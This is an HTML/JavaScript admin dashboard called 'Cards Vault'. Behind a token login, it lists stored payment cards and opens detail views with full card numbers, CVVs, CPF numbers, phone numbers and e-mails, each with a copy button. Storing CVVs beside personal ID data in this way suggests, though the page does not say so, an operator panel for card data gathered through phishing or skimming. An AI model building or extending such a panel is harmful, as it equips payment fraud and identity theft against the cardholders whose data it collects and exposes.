<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Cards Vault — Admin</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  :root{
    --bg:#0f0f12;--surface:#18181f;--border:#2a2a35;
    --red:#FE2C55;--red-dim:rgba(254,44,85,.12);
    --green:#22c55e;--text:#f0f0f5;--t2:#a0a0b0;--t3:#60607a;
  }
  body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh}

  /* LOGIN */
  #loginScreen{display:flex;align-items:center;justify-content:center;min-height:100vh;background:radial-gradient(ellipse at 60% 40%,rgba(254,44,85,.08) 0%,transparent 60%),var(--bg)}
  .login-box{background:var(--surface);border:1px solid var(--border);border-radius:20px;padding:40px 36px;width:100%;max-width:380px;text-align:center}
  .login-logo{font-size:36px;margin-bottom:8px}
  .login-title{font-size:22px;font-weight:800;margin-bottom:4px}
  .login-sub{font-size:13px;color:var(--t2);margin-bottom:28px}
  .login-input{width:100%;height:48px;background:var(--bg);border:1.5px solid var(--border);border-radius:12px;padding:0 16px;font-size:14px;color:var(--text);font-family:monospace;letter-spacing:2px;outline:none;transition:border-color .2s}
  .login-input:focus{border-color:var(--red)}
  .login-btn{width:100%;height:48px;background:var(--red);border:none;border-radius:12px;color:#fff;font-size:15px;font-weight:800;cursor:pointer;font-family:inherit;margin-top:14px;transition:opacity .15s}
  .login-btn:hover{opacity:.88}
  .login-err{font-size:12px;color:var(--red);margin-top:10px;display:none}

  /* MAIN */
  #mainScreen{display:none}
  .topbar{background:var(--surface);border-bottom:1px solid var(--border);padding:0 28px;height:58px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:10}
  .topbar-brand{display:flex;align-items:center;gap:10px}
  .topbar-icon{font-size:22px}
  .topbar-name{font-size:16px;font-weight:800}
  .topbar-env{font-size:10px;font-weight:700;background:rgba(254,44,85,.18);color:var(--red);border:1px solid rgba(254,44,85,.3);border-radius:5px;padding:2px 7px;letter-spacing:.5px}
  .btn-logout{background:none;border:1.5px solid var(--border);border-radius:8px;color:var(--t2);font-size:12px;font-weight:600;padding:6px 14px;cursor:pointer;font-family:inherit;transition:all .15s}
  .btn-logout:hover{border-color:var(--red);color:var(--red)}

  .content{padding:28px;max-width:1100px;margin:0 auto}

  /* STATS */
  .stats-row{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:14px;margin-bottom:28px}
  .stat-card{background:var(--surface);border:1px solid var(--border);border-radius:14px;padding:18px 20px}
  .stat-label{font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.8px;margin-bottom:6px}
  .stat-value{font-size:28px;font-weight:900;line-height:1}
  .stat-card.highlight .stat-value{color:var(--red)}

  /* TOOLBAR */
  .toolbar{display:flex;align-items:center;gap:12px;margin-bottom:18px;flex-wrap:wrap}
  .search-wrap{position:relative;flex:1;min-width:200px}
  .search-input{width:100%;height:42px;background:var(--surface);border:1.5px solid var(--border);border-radius:10px;padding:0 16px 0 40px;font-size:13px;color:var(--text);outline:none;font-family:inherit;transition:border-color .2s}
  .search-input:focus{border-color:var(--red)}
  .search-ico{position:absolute;left:13px;top:50%;transform:translateY(-50%);color:var(--t3);font-size:15px}
  .btn-toolbar{height:42px;padding:0 18px;background:var(--surface);border:1.5px solid var(--border);border-radius:10px;color:var(--t2);font-size:13px;font-weight:600;cursor:pointer;font-family:inherit;display:flex;align-items:center;gap:7px;transition:all .15s;white-space:nowrap}
  .btn-toolbar:hover{border-color:var(--t2);color:var(--text)}
  .btn-danger{border-color:rgba(254,44,85,.4);color:var(--red)}
  .btn-danger:hover{background:var(--red-dim);border-color:var(--red)}

  /* TABLE */
  .table-wrap{background:var(--surface);border:1px solid var(--border);border-radius:14px;overflow:hidden}
  .t-head{display:grid;grid-template-columns:1.6fr 1.1fr 90px 80px 88px 130px 72px;padding:10px 18px;border-bottom:1px solid var(--border);font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.7px}
  .t-body{max-height:calc(100vh - 340px);overflow-y:auto}
  .t-row{display:grid;grid-template-columns:1.6fr 1.1fr 90px 80px 88px 130px 72px;padding:12px 18px;border-bottom:1px solid var(--border);align-items:center;transition:background .1s}
  .t-row:last-child{border-bottom:none}
  .t-row:hover{background:rgba(255,255,255,.025)}
  .cell{font-size:13px;color:var(--text);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;min-width:0}
  .cell-sub{font-size:11px;color:var(--t2);margin-top:1px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
  .brand-wrap{display:flex;align-items:center;gap:6px}
  .brand-img{height:22px;object-fit:contain;border-radius:3px}
  .brand-unknown{font-size:10px;font-weight:700;background:#2a2a35;color:var(--t2);border-radius:4px;padding:2px 6px}
  .last4{font-family:monospace;font-size:13px;font-weight:700;letter-spacing:1px}
  .last4::before{content:'•••• ';color:var(--t3)}
  .expiry-chip{display:inline-flex;align-items:center;gap:4px;font-size:12px;font-weight:600;padding:3px 8px;border-radius:6px}
  .exp-ok{background:rgba(34,197,94,.1);color:var(--green)}
  .exp-warn{background:rgba(251,191,36,.1);color:#fbbf24}
  .date-cell{font-size:12px;color:var(--t2)}
  .actions{display:flex;align-items:center;gap:6px}
  .btn-eye,.btn-del{width:32px;height:32px;border:1.5px solid var(--border);border-radius:8px;background:none;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:all .15s;flex-shrink:0}
  .btn-eye{color:var(--t2);font-size:15px}
  .btn-eye:hover{border-color:var(--red);color:var(--red);background:var(--red-dim)}
  .btn-del{color:var(--t3)}
  .btn-del:hover{border-color:var(--red);color:var(--red);background:var(--red-dim)}

  /* EMPTY / LOADING */
  .empty{padding:60px 20px;text-align:center;color:var(--t3)}
  .empty-ico{font-size:40px;margin-bottom:12px}
  .loading{padding:40px;text-align:center;color:var(--t3);font-size:13px}

  /* DETAIL MODAL */
  #detailModal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.8);z-index:200;align-items:center;justify-content:center;backdrop-filter:blur(8px);padding:20px}
  #detailModal.show{display:flex}
  .detail-box{background:var(--surface);border:1px solid var(--border);border-radius:20px;width:100%;max-width:600px;max-height:92vh;overflow-y:auto}
  .detail-hd{display:flex;align-items:center;justify-content:space-between;padding:20px 22px 16px;border-bottom:1px solid var(--border)}
  .detail-title{font-size:16px;font-weight:800;display:flex;align-items:center;gap:8px}
  .detail-close{width:32px;height:32px;background:none;border:1.5px solid var(--border);border-radius:8px;color:var(--t2);font-size:18px;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:all .15s}
  .detail-close:hover{border-color:var(--red);color:var(--red)}

  /* Visual card */
  .vc-wrap{padding:18px 22px}
  .vc{
    background:linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%);
    border-radius:16px;padding:22px 24px;position:relative;overflow:hidden;
    min-height:160px;border:1px solid rgba(255,255,255,.08);
  }
  .vc::before{content:'';position:absolute;top:-40px;right:-40px;width:180px;height:180px;border-radius:50%;background:rgba(255,255,255,.04)}
  .vc::after{content:'';position:absolute;bottom:-50px;left:-20px;width:200px;height:200px;border-radius:50%;background:rgba(255,255,255,.03)}
  .vc-brand{position:absolute;top:18px;right:20px}
  .vc-brand img{height:30px;object-fit:contain}
  .vc-chip{width:38px;height:28px;background:linear-gradient(135deg,#d4a843,#f0c96a);border-radius:5px;margin-bottom:18px;position:relative;z-index:1}
  .vc-number{font-family:monospace;font-size:18px;font-weight:600;letter-spacing:3px;color:#fff;margin-bottom:14px;position:relative;z-index:1;display:flex;gap:14px;align-items:center}
  .vc-number span.hidden{opacity:.5}
  .vc-bottom{display:flex;align-items:flex-end;justify-content:space-between;position:relative;z-index:1}
  .vc-label{font-size:9px;color:rgba(255,255,255,.5);text-transform:uppercase;letter-spacing:1px;margin-bottom:2px}
  .vc-val{font-size:13px;font-weight:600;color:#fff;font-family:monospace;letter-spacing:1px}
  .vc-name{font-size:13px;font-weight:600;color:#fff;letter-spacing:1px;text-transform:uppercase}
  .vc-badges{display:flex;gap:6px;margin-top:12px;padding:0 2px}
  .vc-badge{font-size:11px;font-weight:700;padding:3px 10px;border-radius:5px;letter-spacing:.5px;text-transform:uppercase}
  .badge-level{background:rgba(212,168,67,.2);color:#f0c96a;border:1px solid rgba(212,168,67,.4)}
  .badge-type{background:rgba(99,179,237,.15);color:#63b3ed;border:1px solid rgba(99,179,237,.3)}
  .badge-bank{background:rgba(255,255,255,.07);color:rgba(255,255,255,.7);border:1px solid rgba(255,255,255,.12)}

  /* Info grid */
  .detail-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;padding:6px 22px 22px}
  .df{display:flex;flex-direction:column;gap:4px}
  .df-label{font-size:10px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.7px}
  .df-value{font-size:13px;color:var(--text);font-family:monospace;background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:7px 11px;word-break:break-all;line-height:1.4}
  .df-value.hi{color:var(--red);font-weight:700}
  .df-copy{display:inline-flex;align-items:center;gap:4px;margin-top:3px;background:none;border:1px solid var(--border);border-radius:5px;color:var(--t3);font-size:10px;padding:2px 8px;cursor:pointer;font-family:inherit;transition:all .15s;width:fit-content}
  .df-copy:hover{border-color:var(--t2);color:var(--text)}
  .df-copy.ok{border-color:var(--green);color:var(--green)}
  .df-full{grid-column:1/-1}
  .df-half{grid-column:span 2}

  /* CONFIRM MODAL */
  #confirmModal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:300;align-items:center;justify-content:center;backdrop-filter:blur(4px)}
  #confirmModal.show{display:flex}
  .confirm-box{background:var(--surface);border:1px solid var(--border);border-radius:18px;padding:28px 24px;width:100%;max-width:340px;text-align:center}
  .confirm-ico{font-size:36px;margin-bottom:12px}
  .confirm-title{font-size:17px;font-weight:800;margin-bottom:8px}
  .confirm-sub{font-size:13px;color:var(--t2);line-height:1.5;margin-bottom:22px}
  .confirm-btns{display:flex;gap:10px}
  .confirm-cancel{flex:1;height:44px;background:none;border:1.5px solid var(--border);border-radius:10px;color:var(--t2);font-size:14px;font-weight:600;cursor:pointer;font-family:inherit}
  .confirm-ok{flex:1;height:44px;background:var(--red);border:none;border-radius:10px;color:#fff;font-size:14px;font-weight:700;cursor:pointer;font-family:inherit}

  @media(max-width:700px){
    .t-head,.t-row{grid-template-columns:1fr 90px 80px 72px}
    .col-cpf,.col-date{display:none}
    .content{padding:16px}
    .stats-row{grid-template-columns:1fr 1fr}
    .detail-grid{grid-template-columns:1fr}
  }
</style>
</head>
<body>

<!-- LOGIN -->
<div id="loginScreen">
  <div class="login-box">
    <div class="login-logo">🔐</div>
    <div class="login-title">Cards Vault</div>
    <div class="login-sub">Ambiente de testes — acesso restrito</div>
    <input class="login-input" type="password" id="tokenInput" placeholder="Token de acesso" onkeydown="if(event.key==='Enter')login()"/>
    <button class="login-btn" onclick="login()">Entrar</button>
    <div class="login-err" id="loginErr">Token inválido.</div>
  </div>
</div>

<!-- MAIN -->
<div id="mainScreen">
  <div class="topbar">
    <div class="topbar-brand">
      <span class="topbar-icon">🔐</span>
      <span class="topbar-name">Cards Vault</span>
      <span class="topbar-env">TESTE</span>
    </div>
    <button class="btn-logout" onclick="logout()">Sair</button>
  </div>

  <div class="content">
    <div class="stats-row">
      <div class="stat-card highlight"><div class="stat-label">Total de cartões</div><div class="stat-value" id="statTotal">—</div></div>
      <div class="stat-card"><div class="stat-label">Últimas 24h</div><div class="stat-value" id="statLast24">—</div></div>
      <div class="stat-card"><div class="stat-label" id="sb1l">—</div><div class="stat-value" id="sb1v">0</div></div>
      <div class="stat-card"><div class="stat-label" id="sb2l">—</div><div class="stat-value" id="sb2v">0</div></div>
    </div>

    <div class="toolbar">
      <div class="search-wrap">
        <span class="search-ico">🔍</span>
        <input class="search-input" id="searchInput" placeholder="Buscar por nome, e-mail, bandeira ou final..." oninput="debounceSearch()"/>
      </div>
      <button class="btn-toolbar" onclick="loadAll()">↻ Atualizar</button>
      <button class="btn-toolbar btn-danger" onclick="confirmClearAll()">🗑 Limpar tudo</button>
    </div>

    <div class="table-wrap">
      <div class="t-head">
        <div>Nome / E-mail</div>
        <div class="col-cpf">CPF</div>
        <div>Bandeira</div>
        <div>Final</div>
        <div>Validade</div>
        <div class="col-date">Cadastrado em</div>
        <div></div>
      </div>
      <div class="t-body" id="tableBody"><div class="loading">Carregando...</div></div>
    </div>
  </div>
</div>

<!-- DETAIL MODAL -->
<div id="detailModal" onclick="if(event.target===this)closeDetail()">
  <div class="detail-box">
    <div class="detail-hd">
      <div class="detail-title">💳 Dados completos</div>
      <button class="detail-close" onclick="closeDetail()">×</button>
    </div>
    <div id="detailCardWrap" class="vc-wrap"></div>
    <div class="detail-grid" id="detailGrid"></div>
  </div>
</div>

<!-- CONFIRM MODAL -->
<div id="confirmModal">
  <div class="confirm-box">
    <div class="confirm-ico" id="cIco">⚠️</div>
    <div class="confirm-title" id="cTitle">Confirmar</div>
    <div class="confirm-sub" id="cSub"></div>
    <div class="confirm-btns">
      <button class="confirm-cancel" onclick="closeConfirm()">Cancelar</button>
      <button class="confirm-ok" id="cOk">Confirmar</button>
    </div>
  </div>
</div>

<script>
const BRAND_LOGOS = {
  visa:       'https://cdn.jsdelivr.net/gh/aaronfagan/svg-credit-card-payment-icons/flat/visa.svg',
  mastercard: 'https://cdn.jsdelivr.net/gh/aaronfagan/svg-credit-card-payment-icons/flat/mastercard.svg',
  amex:       'https://cdn.jsdelivr.net/gh/aaronfagan/svg-credit-card-payment-icons/flat/amex.svg',
  elo:        'https://cdn.jsdelivr.net/gh/aaronfagan/svg-credit-card-payment-icons/flat/elo.svg',
  hipercard:  'https://cdn.jsdelivr.net/gh/aaronfagan/svg-credit-card-payment-icons/flat/hipercard.svg',
  maestro:    'https://cdn.jsdelivr.net/gh/aaronfagan/svg-credit-card-payment-icons/flat/maestro.svg',
};

let _token = localStorage.getItem('cv_token') || '';
let _searchTimer = null;
const _cards = {}; // id → card data

// ── Auth ──────────────────────────────────────────────────────────────────────
async function login() {
  const t = document.getElementById('tokenInput').value.trim();
  if (!t) return;
  const r = await fetch('/api/admin/stats', { headers: { 'x-admin-token': t } });
  if (r.ok) {
    _token = t; localStorage.setItem('cv_token', t);
    document.getElementById('loginErr').style.display = 'none';
    showMain();
  } else {
    document.getElementById('loginErr').style.display = 'block';
  }
}
function logout() {
  _token = ''; localStorage.removeItem('cv_token');
  document.getElementById('mainScreen').style.display = 'none';
  document.getElementById('loginScreen').style.display = 'flex';
}
function showMain() {
  document.getElementById('loginScreen').style.display = 'none';
  document.getElementById('mainScreen').style.display = 'block';
  loadAll();
}
if (_token) {
  fetch('/api/admin/stats', { headers: { 'x-admin-token': _token } })
    .then(r => r.ok ? showMain() : logout()).catch(() => {});
}

// ── Load all ──────────────────────────────────────────────────────────────────
async function loadAll() {
  await Promise.all([loadStats(), loadCards()]);
}
async function loadStats() {
  const r = await fetch('/api/admin/stats', { headers: { 'x-admin-token': _token } });
  if (!r.ok) return;
  const d = await r.json();
  document.getElementById('statTotal').textContent  = d.total;
  document.getElementById('statLast24').textContent = d.last24;
  const brands = d.brands || [];
  [[0,'sb1l','sb1v'],[1,'sb2l','sb2v']].forEach(([i,l,v]) => {
    const b = brands[i];
    document.getElementById(l).textContent = b ? b.brand.charAt(0).toUpperCase()+b.brand.slice(1) : '—';
    document.getElementById(v).textContent = b ? b.count : '0';
  });
}
async function loadCards(search) {
  const q = search ? '?search='+encodeURIComponent(search) : '';
  const r = await fetch('/api/admin/cards'+q, { headers: { 'x-admin-token': _token } });
  if (!r.ok) return;
  const d = await r.json();
  renderTable(d.cards || []);
}
function debounceSearch() {
  clearTimeout(_searchTimer);
  _searchTimer = setTimeout(() => loadCards(document.getElementById('searchInput').value.trim() || undefined), 350);
}

// ── Table ─────────────────────────────────────────────────────────────────────
function renderTable(cards) {
  const body = document.getElementById('tableBody');
  if (!cards.length) {
    body.innerHTML = '<div class="empty"><div class="empty-ico">💳</div><div>Nenhum cartão cadastrado</div></div>';
    return;
  }
  cards.forEach(c => _cards[c.id] = c);
  body.innerHTML = cards.map(c => {
    const brandImg = BRAND_LOGOS[c.brand]
      ? `<img class="brand-img" src="${BRAND_LOGOS[c.brand]}" alt="${c.brand}"/>`
      : `<span class="brand-unknown">${c.brand||'?'}</span>`;
    const expParts = (c.expiry||'').split('/');
    let expClass = 'exp-ok', expIcon = '✓';
    if (expParts.length===2) {
      const m=parseInt(expParts[0]), y=parseInt('20'+expParts[1]);
      const now=new Date();
      if ((y-now.getFullYear())*12+(m-now.getMonth()-1)<=3) { expClass='exp-warn'; expIcon='⚠'; }
    }
    const date = c.created_at
      ? new Date(c.created_at).toLocaleString('pt-BR',{timeZone:'America/Sao_Paulo',day:'2-digit',month:'2-digit',year:'2-digit',hour:'2-digit',minute:'2-digit'})
      : '—';
    const cd = JSON.stringify(c).replace(/"/g,'&quot;');
    return `<div class="t-row">
      <div class="cell"><div>${esc(c.nome||'—')}</div><div class="cell-sub">${esc(c.email||'—')}</div></div>
      <div class="cell col-cpf">${esc(c.cpf||'—')}</div>
      <div class="cell"><div class="brand-wrap">${brandImg}</div></div>
      <div class="cell"><span class="last4">${esc(c.last4)}</span></div>
      <div class="cell"><span class="expiry-chip ${expClass}">${expIcon} ${esc(c.expiry)}</span></div>
      <div class="cell col-date date-cell">${date}</div>
      <div class="cell actions">
        <button class="btn-eye" onclick="openDetail('${c.id}')" title="Ver todos os dados">👁</button>
        <button class="btn-del" onclick="confirmDelete('${esc(c.id)}','${esc(c.nome||'este cartão')}')" title="Deletar">
          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14H6L5 6"/><path d="M10 11v6M14 11v6"/><path d="M9 6V4h6v2"/></svg>
        </button>
      </div>
    </div>`;
  }).join('');
}

// ── Detail modal ──────────────────────────────────────────────────────────────
function openDetail(id) {
  const c = _cards[id]; if (!c) return;

  /* ── Visual card ── */
  const brandLogo = BRAND_LOGOS[c.brand]
    ? `<img src="${BRAND_LOGOS[c.brand]}" alt="${c.brand||''}" />`
    : `<span style="font-size:11px;color:rgba(255,255,255,.7);font-weight:700;text-transform:uppercase">${esc(c.brand||'CARD')}</span>`;

  // Format card number: show full number if available, else mask
  let numDisplay = '';
  const rawNum = (c.card_number || '').replace(/\D/g, '');
  if (rawNum.length >= 12) {
    const chunks = rawNum.match(/.{1,4}/g) || [];
    numDisplay = chunks.map((ch, i) => `<span>${ch}</span>`).join('');
  } else {
    numDisplay = `<span class="hidden">••••</span><span class="hidden">••••</span><span class="hidden">••••</span><span>${esc(c.last4||'????')}</span>`;
  }

  // Level badge: extract keyword from card_level string
  const lvlStr = (c.card_level || '').toLowerCase();
  const LEVELS = [['platinum','PLATINUM'],['gold','GOLD'],['infinite','INFINITE'],['black','BLACK'],['signature','SIGNATURE'],['world','WORLD'],['classic','CLASSIC'],['standard','STANDARD']];
  let levelBadge = '';
  for (const [k, v] of LEVELS) { if (lvlStr.includes(k)) { levelBadge = `<span class="vc-badge badge-level">${v}</span>`; break; } }
  if (!levelBadge && c.card_level) levelBadge = `<span class="vc-badge badge-level">${esc(c.card_level.toUpperCase())}</span>`;

  // Type badge
  const typeRaw = (c.card_type || '').toLowerCase();
  const typeLabel = typeRaw === 'credit' ? 'CRÉDITO' : typeRaw === 'debit' ? 'DÉBITO' : typeRaw ? typeRaw.toUpperCase() : '';
  const typeBadge = typeLabel ? `<span class="vc-badge badge-type">${typeLabel}</span>` : '';

  // Bank badge
  const bankBadge = c.bank ? `<span class="vc-badge badge-bank">${esc(c.bank)}</span>` : '';

  document.getElementById('detailCardWrap').innerHTML = `
    <div class="vc">
      <div class="vc-brand">${brandLogo}</div>
      <div class="vc-chip"></div>
      <div class="vc-number">${numDisplay}</div>
      <div class="vc-bottom">
        <div>
          <div class="vc-label">Titular</div>
          <div class="vc-name">${esc((c.nome||'—').toUpperCase())}</div>
        </div>
        <div style="text-align:right">
          <div class="vc-label">Validade</div>
          <div class="vc-val">${esc(c.expiry||'—')}</div>
        </div>
      </div>
    </div>
    ${(levelBadge||typeBadge||bankBadge) ? `<div class="vc-badges">${levelBadge}${typeBadge}${bankBadge}</div>` : ''}
  `;

  /* ── Info grid ── */
  const date = c.created_at ? new Date(c.created_at).toLocaleString('pt-BR',{timeZone:'America/Sao_Paulo'}) : '—';

  document.getElementById('detailGrid').innerHTML = `
    ${df('Nome completo', c.nome, true, 'half')}
    ${df('CPF', c.cpf, true, '', true)}
    ${df('E-mail', c.email, true, 'half')}
    ${df('Telefone', c.telefone, true)}
    ${df('Número do cartão', c.card_number, true, 'half')}
    ${df('CVV / CSC', c.cvv, true)}
    ${df('Validade', c.expiry, true)}
    ${df('Cadastrado em', date, false, 'half')}
    ${df('ID registro', c.id, true, 'full')}
  `;

  document.getElementById('detailModal').classList.add('show');
}
function closeDetail() { document.getElementById('detailModal').classList.remove('show'); }

// df(label, value, copyable, span='', highlight=false)
// span: '' | 'half' | 'full'
function df(label, value, copyable, span, highlight) {
  const v = value || '—';
  const copyBtn = copyable && value ? `<button class="df-copy" onclick="cp(this,'${esc(String(value))}')">📋 copiar</button>` : '';
  const spanCls = span === 'full' ? ' df-full' : span === 'half' ? ' df-half' : '';
  return `<div class="df${spanCls}"><div class="df-label">${label}</div><div class="df-value${highlight?' hi':''}">${esc(v)}</div>${copyBtn}</div>`;
}
function cp(btn, text) {
  navigator.clipboard.writeText(text).then(() => {
    btn.textContent='✓ copiado'; btn.classList.add('ok');
    setTimeout(()=>{ btn.textContent='📋 copiar'; btn.classList.remove('ok'); }, 1800);
  });
}

// ── Delete ────────────────────────────────────────────────────────────────────
function confirmDelete(id, nome) {
  openConfirm('🗑️','Deletar cartão',`Deseja deletar o cartão de <strong>${esc(nome)}</strong>?`, async () => {
    await fetch('/api/admin/cards/'+id, { method:'DELETE', headers:{'x-admin-token':_token} });
    loadAll();
  });
}
function confirmClearAll() {
  openConfirm('⚠️','Limpar todos os cartões','Isso irá deletar <strong>TODOS</strong> os cartões. Ação irreversível.', async () => {
    await fetch('/api/admin/cards', { method:'DELETE', headers:{'x-admin-token':_token,'Content-Type':'application/json'}, body:JSON.stringify({confirm:'DELETAR_TUDO'}) });
    loadAll();
  });
}

// ── Confirm modal ─────────────────────────────────────────────────────────────
function openConfirm(ico, title, sub, cb) {
  document.getElementById('cIco').textContent   = ico;
  document.getElementById('cTitle').textContent = title;
  document.getElementById('cSub').innerHTML     = sub;
  document.getElementById('cOk').onclick = () => { closeConfirm(); cb(); };
  document.getElementById('confirmModal').classList.add('show');
}
function closeConfirm() { document.getElementById('confirmModal').classList.remove('show'); }

function esc(s) { return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
</script>
